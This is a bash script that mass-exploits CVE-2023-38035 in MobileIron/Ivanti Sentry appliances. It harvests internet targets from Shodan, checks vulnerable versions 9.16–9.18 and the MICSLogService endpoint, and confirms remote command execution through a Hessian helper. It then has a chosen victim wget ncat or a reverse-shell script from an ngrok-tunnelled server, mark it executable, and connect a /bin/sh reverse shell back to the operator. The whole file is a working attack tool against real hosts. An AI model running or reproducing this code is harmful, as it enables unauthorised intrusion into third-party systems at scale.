#!/bin/bash


banner(){
    echo '
    __  ___ ____ ______ _____           
   /  |/  //  _// ____// ___/      _     
  / /|_/ / / / / /     \__ \      |-|  __      
 / /  / /_/ / / /___  ___/ /      |=| [Ll]         
/_/ _/_//___/ \____/ /____/       "^" ====`o          
   / / / /__  __ ____   / /_ ___   _____
  / /_/ // / / // __ \ / __// _ \ / ___/ author: mind2hex
 / __  // /_/ // / / // /_ /  __// /    
/_/ /_/ \__,_//_/ /_/ \__/ \___//_/     
                                     
                                                         c=====e
   ____________                                         _,,_H__
  (__((__((___()    CVE-2023-38035                     //|     |
 (__((__((___()()_____________________________________// |ACME |
(__((__((___()()()------------------------------------/  |_____|
    '
}


# check_requirements checks that the necessary 
# programs are installed and the necessary 
# files exist in the current working directory
check_requirements(){
    # checking necessary programs
    echo -e "\n[!] CHECKING REQUIREMENTS..."
    for program in $( echo -e "shodan\njq\npython\nngrok\nterminator" );do 
        which $program &>/dev/null
        if [[ $? -ne 0 ]];then
            echo -e "[X] \e[31m ${program} \e[0m\t IS NOT INSTALLED"
            echo -e "\n- TO INSTALL PYTHON     EXECUTE: sudo apt install python3"
            echo -e "\n- TO INSTALL SHODAN     EXECUTE: sudo apt install python3-shodan"
            echo      "  SHODAN SHOULD BE CONFIGURED WITH API KEY"
            echo -e "\n- TO INSTALL PYHESSIAN  EXECUTE: pip3 install pyhessian python-hessian"
            echo -e "\n- TO INSTALL NGROK   VISIT: https://ngrok.com/download"
            echo -e   "  NGROK SHOULD BE INSIDE EXECUTBLE PATH \$PATH"
            echo -e "\n- TO INSTALL TERMINATOR EXECUTE: sudo apt install terminator"
            exit
        else
            printf "%-20s \e[32m%s\e[0m\n" "${program}" "INSTALLED"
        fi
    done

    # checking ngrok configuration 
    NGROK_CONFIGURATION_FILE=${HOME}/.config/ngrok/ngrok.yml
    if [[ -e  ${NGROK_CONFIGURATION_FILE} ]];then
        if [[ -n $( cat ~/.config/ngrok/ngrok.yml | grep -E -o "authtoken.*" | cut -d ' ' -f 2 ) ]];then
            echo -e "\n[!] NGROK CONFIGURED PROPERLY..."
        else
            echo -e "\n[X] NGROK AUTHTOKEN NOT FOUND IN "
            exit
        fi
    else
        echo -e "\n[X] NGROK CONFIGURATION FILE ${NGROK_CONFIGURATION_FILE} NOT FOUND"
        exit
    fi
    
    # checking shodan configuration
    shodan info &>/dev/null
    if [[ $? -ne 0 ]];then
        echo -e "\n[X] SHODAN IS NOT CONFIGURED PROPERLY, TRY EXECUTING:"
        echo -e "\t shodan init <api key>"
        exit
    else
        if [[ $(shodan info | head -n1 | grep -E -o "[0-9]*") -eq 0 ]];then 
            echo -e "\n[X] SHODAN SCAN NOT AVAILABLE DUE TO 0 CREDITS SCAN"
            echo "[X] TRY USING ANOTHER SHODAN API KEY WITH SCAN CREDITS AND EXECUTE:"
            echo -e "\t shodan init <api key>"
            exit
        else
            if [[ ! -e "${HOME}/.config/shodan/api_key" ]];then
                echo -e "\n[X] SHODAN API KEY IS NOT CONFIGURED PROPERLY, TRY EXECUTING:"
                echo -e "\t shodan init <api key>"
                exit
            fi
        fi    
    fi
    echo -e "\n[!] SHODAN CONFIGURED PROPERLY"

    # check if ncat is in the current working directory
    echo -e "\n[!] CHECKING NCAT"
    if [[ -e "./ncat" ]];then
        echo -e "[!] \e[32m ncat \e[0m\t EXIST IN THE CURRENT DIRECTORY"
    else
        echo -e "[X] \e[31m ncat \e[0m\t DOESN'T EXIST IN THE CURRENT DIRECTORY"
        echo "[!] EXECUTING wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat --quiet"
        wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat --quiet
        progress_bar 4
        if [[ $? -ne 0 ]];then
            echo -e "[X] \e[31m error trying to download ncat from https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/ncat \e[0m"
            exit
        fi
    fi

    # check if multi_reverse.sh is in the current working directory
    echo -e "\n[!] CHECKING MULTI_REVERSE"
    if [[ -e "./multi_reverse.sh" ]];then
        echo -e "[!] \e[32m multi_reverse.sh \e[0m\t EXIST IN THE CURRENT DIRECTORY"
    else
        echo -e "[X] \e[31m multi_reverse.sh \e[0m\t DOESN'T EXIST IN THE CURRENT DIRECTORY"
        echo "[!] EXECUTING wget https://raw.githubusercontent.com/mind2hex/multi_reverse/main/multi_reverse.sh --quiet"
        wget https://raw.githubusercontent.com/mind2hex/multi_reverse/main/multi_reverse.sh --quiet
        progress_bar 4
        if [[ $? -ne 0 ]];then
            echo -e "[X] \e[31m error trying to download ncat from https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/ncat \e[0m"
            exit
        fi
    fi

    # check if pyhessian is installed
    echo -e "\n[!] CHECKING PYHESSIAN AND PYHESSIAN CLIENT"
    pip show pyhessian >/dev/null
    if [[ $? -ne 0 ]];then
        echo -e "[X] \e[31m pyhessian  \e[0m\t IS NOT INSTALLED"
        echo -e "[X] EXECUTE: \e[31m pip3 install pyhessian  \e[0m"
        exit
    else
        pip show python-hessian >/dev/null
        if [[ $? -ne 0 ]];then
            echo -e "[X] \e[31m python-hessian  \e[0m\t IS NOT INSTALLED"
            echo -e "[X] EXECUTE: \e[31m pip3 install python-hessian  \e[0m"
            exit
        else
            echo -e "[!] \e[32m pyhessian and python-hessian \e[0m\t ARE CURRENTLY INSTALLED"
        fi
    fi
    

}


# download_shodan_results download and parse all possible targets
# IP addresses with the specified query from shodan and saving it in IP_ADDRESSES array
download_shodan_results(){
    # downloading search results for MobileIron
    IP_ADDRESSES_FILENAME="shodan_scan_result"
    if [[ ! ( -e "${IP_ADDRESSES_FILENAME}.json.gz" ) ]];then
        echo -e "\n[!] DOWNLOADING SEARCH RESULT..."
        shodan download shodan_scan_result "http.title:'MobileIron System Manager'"
    else
        echo "[!] SEARCH RESULT ALREADY DOWNLOADED..."
    fi

    # extracting ip addresses
    echo -e "\n[!] EXTRACTING ALL POSSIBLE TARGETS IP ADDRESSES"
    gzip -d ${IP_ADDRESSES_FILENAME}.json.gz
    IP_ADDRESSES=$( jq '.ip_str' ${IP_ADDRESSES_FILENAME}.json | sed 's/"//g' )
}


# scan_targets test all ip addresses from IP_ADDRESSES for CVE-2023-38035
# searching for the specified version
scan_targets(){
    # setting up a trap in case of user keyboard interrupt or CTRL + C (SIGINT)
    # this will stop scanning without finishing program 
    trap handle_sigint SIGINT

    VULNERABLE_IP_ARRAY=()
    exit_loop=false
    echo "-------------------------------------------------"
    echo "PRESS CTRL + C TO STOP VULNERABILITY IP DISCOVERY"
    echo "-------------------------------------------------"
    for IP in ${IP_ADDRESSES[@]};do
        # ejecutar bucle hasta SIGINT
        if [[ "${exit_loop}" == true ]];then
            break
        fi

        printf "[!] Trying: %-20s --> " "${IP}"
        # checking vulnerable versions 9.16 - 9.18
        REQUEST_RESULT=$( curl -s --max-time 4 -k "https://${IP}:8443/mics/login.jsp" | grep -E -o "product-version.*[0-9\.]*" | grep -o "[0-9\.]*" ) # change max time if needed
        REQUEST_SC=""
        RESULT_TEST=""
        if [[ ${REQUEST_RESULT} == "9.16.0" || ${REQUEST_RESULT} == "9.17.0" || ${REQUEST_RESULT} == "9.18.0" ]];then

            # checking /mics/services/MICSLogService
            REQUEST_SC=$( curl -k -s --max-time 4 -o /dev/null -s -w "%{http_code}\n" https://${IP}:8443/mics/services/MICSLogService )
            if [[ -n ${REQUEST_SC} && ${REQUEST_SC} -eq "405" ]];then

                # checking if target is executing commands
                RESULT_TEST=$( python3 hessian.py https://${IP}:8443/mics/services/MICSLogService "whoami" | head -n 1 | grep -E -o "isRunning.*(True|False)" | cut -d " " -f 2 )
                if [[ ${RESULT_TEST} == "True" ]];then
                    VULNERABLE_IP_ARRAY+=("${IP}")
                    printf "\e[31m%-12s %-16s %-25s %-15s\e[0m\n" "VULNERABLE" "version[${REQUEST_RESULT}]" "MICSLogService_sc[${REQUEST_SC}]" "isRunning[${RESULT_TEST}]"
                    continue
                fi
            fi
        fi

        printf "%-12s %-16s %-25s %-15s\n" "NOTHING" "version[${REQUEST_RESULT}]" "MICSLogService_sc[${REQUEST_SC}]" "isRunning[${RESULT_TEST}]"
        
    done  

    trap - SIGINT
}

handle_sigint(){
    exit_loop=true
}


# spawn_shell_on_target show all vulnerables ip from VULNERABLE_IP_ARRAY to user 
# so user can select on which IP address to spawn a shell using ngrok and php-reverse-shell.php file
spawn_shell_on_target(){
    # selecting target
    echo ""
    echo "-------------------------------------------------"
    echo "SELECT AN IP ADDRESS TO START A REVERSE SHELL    "
    echo "-------------------------------------------------"
    counter=0
    for IP in ${VULNERABLE_IP_ARRAY[@]};do
        printf "[%3d] %s\n" "${counter}" "${IP}"
        counter=$( expr ${counter} + 1 )
    done
    echo -n "SELECT IP >> "
    read TARGET_IP

    CURRENT_TARGET=${VULNERABLE_IP_ARRAY[${TARGET_IP}]}
    URL_TARGET="https://${CURRENT_TARGET}:8443/mics/services/MICSLogService"


    # selecting reverse shell method
    echo -e "\n\n"
    echo "-------------------------------------------------"
    echo "SELECT REVERSE SHELL METHOD                      "
    echo "-------------------------------------------------"
    echo "[001] Download ncat on target machine and execute reverse shell"
    echo "[002] Download multi_reverse.sh on target machine and try different methods" 
    echo -n "SELECT METHOD >> "
    read METHOD

    LISTENING_PORT=6969

    # starting web server
    echo -e "\n[\e[32m!\e[0m] STARTING WEB SERVER TO DOWNLOAD \e[32mncat\e[0m ON TARGET MACHINE"
    python -m http.server ${LISTENING_PORT}  &
    progress_bar 5    

    # starting ngrok
    echo -e "\n[\e[32m!\e[0m] STARTING NGROK --> \e[32mngrok http ${LISTENING_PORT}\e[0m"
    terminator -e "ngrok http ${LISTENING_PORT}"
    progress_bar 5
    
    # getting public url of ngrok tunnel
    PUBLIC_URL=$( curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url')
    echo -e "\n[\e[32m!\e[0m] NGROK URL: ${PUBLIC_URL}"

    if [[ ${METHOD} -eq 1 ]];then
        PAYLOAD="ncat"
    elif [[ ${METHOD} -eq 2 ]];then
        PAYLOAD="multi_reverse.sh"
    else
        echo "[!] INVALID METHOD..."
        stop_web_server
    fi

    # uploading ncat on target machine 
    COMMAND="wget ${PUBLIC_URL}/${PAYLOAD} -O /tmp/${PAYLOAD}"
    echo -e "\n\n[\e[32m!\e[0m] EXECUTING \e[32m${COMMAND}\e[0m ON TARGET MACHINE \e[31m${URL_TARGET}\e[0m"
    python3 ./hessian.py "${URL_TARGET}" ${COMMAND}
    sleep 5

    # giving execution permission to ncat on target machine
    COMMAND="chmod +x /tmp/${PAYLOAD}"
    echo -e "\n\n[\e[32m!\e[0m] EXECUTING: \e[32m${COMMAND}\e[0m ON TARGET MACHINE \e[31m${CURRENT_TARGET}\e[0m "
    python3 hessian.py "${URL_TARGET}" "${COMMAND}"
    sleep 5

    stop_web_server

    # starting listener
    echo -e "\n[\e[32m!\e[0m] STARTING NC LISTENER ON \e[32mlocalhost:${LISTENING_PORT}\e[0m"
    terminator -T "PWN4BLE" -e "nc -lvnp ${LISTENING_PORT}" 
    progress_bar 2

    # changing ngrok from http to tcp
    echo -e "\n[\e[32m!\e[0m] CHANGING NGROK FROM HTTP TO TCP"
    close_ngrok_tunnel
    sleep 3
    change_ngrok_tunnel ${LISTENING_PORT}
    sleep 3

    ADDR=$( curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url' | cut -d "/" -f 3 | cut -d ":" -f 1 | nslookup | grep "Address" | tail -n 1 | cut -d " " -f 2 )
    PORT=$( curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url' | cut -d "/" -f 3 | cut -d ":" -f 2 )
    echo -e "\n[\e[32m!\e[0m] NGROK ADDRESS: \e[32m${ADDR}:${PORT}\e[0m"

    COMMAND="/tmp/${PAYLOAD} ${ADDR} ${PORT} -e /bin/sh"
    echo -e "\n[\e[32m!\e[0m] EXECUTING \e[32m ${COMMAND} \e[0m ON \e[31m${URL_TARGET}\e[0m"
    python3 hessian.py "${URL_TARGET}" "${COMMAND}"
}

stop_web_server(){
    # stopping web server
    echo -e "\n\n[\e[32m!\e[0m] STOPPING WEB SERVER"
    for job in $(jobs -p);do
        kill $job
    done
    progress_bar 2    
}

close_ngrok_tunnel(){
    curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].name' | xargs -I % curl -X DELETE http://localhost:4040/api/tunnels/%
}

change_ngrok_tunnel(){
    curl -X POST -H "Content-Type: application/json" -d "{\"name\":\"cmd_line\",\"addr\":\"$1\",\"proto\":\"tcp\"}" http://localhost:4040/api/tunnels
}

progress_bar() {
    local duration=$1
    local elapsed=0

    sleep 0.5    
    # Función para dibujar la barra de progreso
    draw_progress_bar() {
        local percent=$((100 * elapsed / duration))
        local completed=$((50 * elapsed / duration))
        printf "\r["
        for i in $(seq 1 $completed); do
        printf "#"
        done
        for i in $(seq $((completed + 1)) 50); do
        printf " "
        done
        printf "] %d%%" $percent
    }

    # Bucle principal para mostrar la barra de progreso
    while [ $elapsed -le $duration ]; do
        draw_progress_bar
        sleep 1
        ((elapsed++))
    done

    # Añadir una nueva línea al final para separar la salida posterior
    echo
}


main(){
    banner
    check_requirements
    download_shodan_results
    scan_targets
    #VULNERABLE_IP_ARRAY=( "127.0.0.1" )  # unmark this to specify the target and mark scan_targets and download_shodan_results
    spawn_shell_on_target
}

main 
